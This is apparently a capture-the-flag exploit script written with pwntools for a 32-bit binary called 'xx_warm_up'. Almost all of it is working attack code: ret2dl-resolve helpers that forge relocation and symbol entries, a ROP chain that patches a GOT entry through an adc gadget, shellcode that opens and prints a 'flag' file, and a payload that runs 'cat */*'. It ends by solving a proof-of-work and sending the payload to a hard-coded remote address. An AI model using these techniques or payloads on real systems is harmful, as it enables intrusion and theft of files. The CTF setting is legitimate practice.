__author__  = 'b1gtang'

import os
import sys
from pwn import *
from time import sleep

context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

BINARY = './xx_warm-up'

code = ELF('./xx_warm_up')

def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def dl_resolve_call_x86(code, base, args):
    code = ELF('./test32')
    # args = [arg0, arg1, arg2]
    jmprel = code.dynamic_value_by_tag('DT_JMPREL')
    relent = code.dynamic_value_by_tag('DT_RELENT')

    addr_reloc = base + relent - ((base - jmprel)% relent)
    reloc_offset = addr_reloc - jmprel

    buf  = p32(code.get_section_by_name('.plt').header.sh_addr)
    buf += p32(reloc_offset)
    buf += p32(0xdeadbeaf) # can be chains, wow
    buf += ''.join(map(p32,args))

    return buf

def dl_resolve_data_x86(code, base, name):
    jmprel = code.dynamic_value_by_tag('DT_JMPREL')#rel_plt
    relent = code.dynamic_value_by_tag('DT_RELENT')
    symtab = code.dynamic_value_by_tag('DT_SYMTAB')#dynsym
    syment = code.dynamic_value_by_tag('DT_SYMENT')
    strtab = code.dynamic_value_by_tag('DT_STRTAB')#dynstr
    versym = code.dynamic_value_by_tag('DT_VERSYM')#version

    addr_reloc = base + relent - ((base - jmprel)% relent)
    padlen_reloc = relent - ((base - jmprel) % relent)

    addr_sym   =  addr_reloc + relent + syment - ((addr_reloc+relent-symtab)%syment)
    padlen_sym = syment - ((addr_reloc+relent-symtab)%syment)
    addr_symstr = addr_sym + syment

    r_info = (((addr_sym - symtab) / syment) << 8) | 0x7
    st_name = addr_symstr - strtab

    buf = 'x'*padlen_reloc
    buf += p32(base) + p32(r_info)                      # Elf32_Rel
    buf += 'y'*padlen_sym
    buf += p32(st_name) +p32(0) + p32(0) + p32(0x12)       # Elf32_Sym
    buf += name+'\x00'

    return buf

#attach(0x8048456)
#bss_base = 0x0804a000
#buf  = 'a'*0x28 + 'bbbb'
#buf += p32(0x080482E0)
#buf += p32(0x080484a9)
#buf += p32(0)
#buf += p32(bss_base + 0x100)
#buf += p32(0x100)
#buf += dl_resolve_call_x86(code, bss_base + 0x120, [bss_base + 0x100])
#r.sendline(buf)
#
#buf  = 'touch hahahahahaha\x00'
#buf  = buf.ljust(0x20, 'a')
#buf += dl_resolve_data_x86(code, bss_base + 0x120, 'system')
#buf  = buf.ljust(0x100, 'a')
#print len(buf)
#r.sendline(buf)

'''
0x08048408 : adc byte ptr [edi + ebx*8 - 0x75], bh ; inc ebp ; or cl, cl ; ret
0x0804861a : pop edi ; pop ebp ; ret
0x080482ad : pop ebx ; ret
'''

addespc=0x80482aa
pebx=0x80482ad
adc=0x8048408
pediebp=0x804861a
#payload=((p32(pebx)+p32(0x2000)+p32(pediebp)+p32(0x804A00C+0x75-0x2000*8)+p32(0)+p32(adc)+p32(pebx)+p32(0x5200)+p32(pediebp)+p32(0x804a00d+0x75-0x5200*8)+p32(0)+p32(adc)+p32(pebx)+p32(0xa00)+p32(addespc)).ljust(0x40,'a')+p32(0x804a044)+p32(0xa00)+p32(pediebp)+p32(0x804a00e+0x75-0xa00*8)+p32(0)+p32(adc)+p32(0x80482FC)+p32(0x804a0a8)+p32(0)*2+'/bin/sh\x00').encode('hex')
sc="""
xchg eax, ecx
push 5
pop eax
push %d
mov ebx,esp
int 0x80
xchg eax,ebx
xchg eax,ecx
mov eax,ebx
push 0x7f
pop edx
int 0x80
dec ebx
push 4
pop eax
int 0x80"""%(u32('flag'))
sc=asm(sc)
sc = ''' 
sub esi, 0x1982f0
mov esp, 0x0804affc
push 0x804a0b8
call esi
'''
sc = asm(sc)
#payload=((p32(pebx)+p32(0xd000)+p32(pediebp)+p32(0x804A00C+0x75-0xd000*8)+'flag'+p32(adc)+p32(pebx)+p32(0xb900)+p32(pediebp)+p32(0x804a00d+0x75-0xb900*8)+p32(0)+p32(adc)+p32(pediebp)+p32(0x804a00e+0x75-0xd00*8)+p32(0)+p32(0x8048518)).ljust(0x40,'a')+p32(0x804a044)+p32(pebx)+p32(0xd00)+p32(adc)+p32(0x80482C0)+p32(0x804a0a4)+p32(0x804a000)+p32(0x1000)+p32(7)+sc).encode('hex')
payload=((p32(pebx)+p32(0x8000)+p32(pediebp)+p32(0x804A00C+0x75-0x8000*8)+'flag'+p32(adc)+p32(pebx)+p32(0x9f00)+p32(pediebp)+p32(0x804a00d+0x75-0x9f00*8)+p32(0)+p32(adc)+p32(pediebp)+p32(0x804a00e+0x75-0xe00*8)+p32(0)+p32(0x8048518)).ljust(0x40,'a')+p32(0x804a044)+p32(pebx)+p32(0xe00)+p32(adc)+p32(0x80482C0)+p32(0x804a0a4)+p32(0x804a000)+p32(0x1000)+p32(7)+sc)
payload=payload.ljust(0x78, 'a')
payload+='cat */*  '
payload = payload.encode('hex')
#payload=payload+'flag'.encode('hex')
print payload
print hex(len(payload))

p=remote("49.4.30.253",31337)

from hashlib import sha256
def pow():
    global p
    chal=p.recvline().strip('\n')
    while True:
        sol = ''.join(random.choice(string.letters+string.digits) for _ in xrange(4))
        if sha256(chal + sol).hexdigest().startswith('00000'):
            p.send(sol)
            return
pow()

p.send(payload)
#gdb.attach(p)
p.interactive()
